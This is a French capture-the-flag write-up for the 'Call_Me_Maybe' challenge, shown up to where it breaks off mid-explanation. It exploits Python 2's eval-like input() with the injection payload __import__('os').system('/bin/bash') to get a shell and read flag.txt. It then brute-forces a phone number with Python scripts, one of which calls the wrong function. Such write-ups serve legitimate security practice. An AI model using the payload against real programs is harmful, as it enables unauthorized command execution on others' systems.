# Writeup challenge Call_Me_Maybe

# Objectif
L'objectif de ce challenge est d'exploiter la vulnérabilité du input de python2. En effet, dans les ancienne version de python, le input était interprété comme un eval. Cela signifie que les inforamtions mises sont exécutées. 

# Vulnérabilité 
Nous voyons assez facilement la vulnérabilité qui est le input comme dit précédement. Nous allons alors voir 2 manières d'exploiter cette vulnérabilité. La manière magnifique et la manière bourine. Nous allons bien entendu commencer par traiter la manière bourine :) 

## Méthode 1 : Méthode bourrine 

Comme dit précédement, les informations mises dans le input sont exécutées. Il faut alors créer un reverse shell en utilisant par exemple le payload suivant :
```bash
__import__('os').system('/bin/bash')
```
Celan nous donnera alors le shell de l'user qui a exécuter le programme. Il vous suffira simplement de lire le fichier `flag.txt` avec la commande suivante : 
```shell
cat flag.txt
```


## Méthode 2 : Méthode élégante 

Nous alons maintenant voir comment faire pour exploiter la vulnérabilité comme il se doit :) Pour cela, nous allons décomposer le challenge : 

### Recherche du numéro de téléphone

Le premier indice que nous avons est le type de numéro de téléphone qui est un numéro Suisse. Pour cela, après une simple recherche internet, nous voyons que le format est le suivant : 
```txt
+41.XX.XXX.XX.XX
```

### Somme des nombres: 

L'information suivante nous dit que la somme des nombres est de 50 sans l'indice. C'est à dire, sans le +41. 
Nous devons alors faire une fonction nous permettant de savoir si la somme des nombres du numéro de téléphone est de 50. Pour cela, voici un petit script python. Cependant, nous remarquons que dans le script fourni, il y a une fonction nommé : `somme_chiffres` nous l'utilisons alors pour nous simplifier la vie ;)
```py
tab_phone_number =[]
def check_50():
    for prefixe in range(100000000, 1000000000):
        nombre = int(str(prefixe))
        if somme_chiffres(nombre) == 50:
            check_phone_number = f"+41.{str(nombre)[0:2]}.{str(nombre)[2:5]}.{str(nombre)[5:7]}.{str(nombre)[7:9]}"
            if check_phone_number == phone_number:
                tab_phone_number.append(check_phone_number)
    return tab_phone_number

print(check_50())
``` 

Cela nous donnera un tableau contenant tous les numéros de téléphone Suisse correspondant à ce critère.

### Impossiblité d'avoir plus de 2 chiffres identiques 

Cette information nous permet d'exclure beaucoup de posiblité. Nous pouvons voir dans le code fourni qu'il y a aussi une fonction qui semble utile nommé : `occurences_max_deux` qui nous permet de savoir s'il y a plus de 2 fois le même nombre dans le numéro de téléphone. Nous adaptons alors le script défini au-dessus :
```py
tab_phone_number =[]
def check_phone_number():
    for prefixe in range(100000000, 1000000000):
        nombre = int(str(prefixe))
        if somme_chiffres(nombre) == 50 and occurences_max_deux(nombre):
            check_phone_number = f"+41.{str(nombre)[0:2]}.{str(nombre)[2:5]}.{str(nombre)[5:7]}.{str(nombre)[7:9]}"
            if check_phone_number == phone_number:
                tab_phone_number.append(check_phone_number)
    return tab_phone_number

print(check_50())
``` 
Cela nous donnera un tableau contenant tous les numéros de téléphone Suisse correspondant au critère de la somme ainsi qu'au critère des chiffres identiques. 

### Début du numéro de téléphone : 98

Une autre indication nous permet de réduire aussi énormément les champs des possibilités
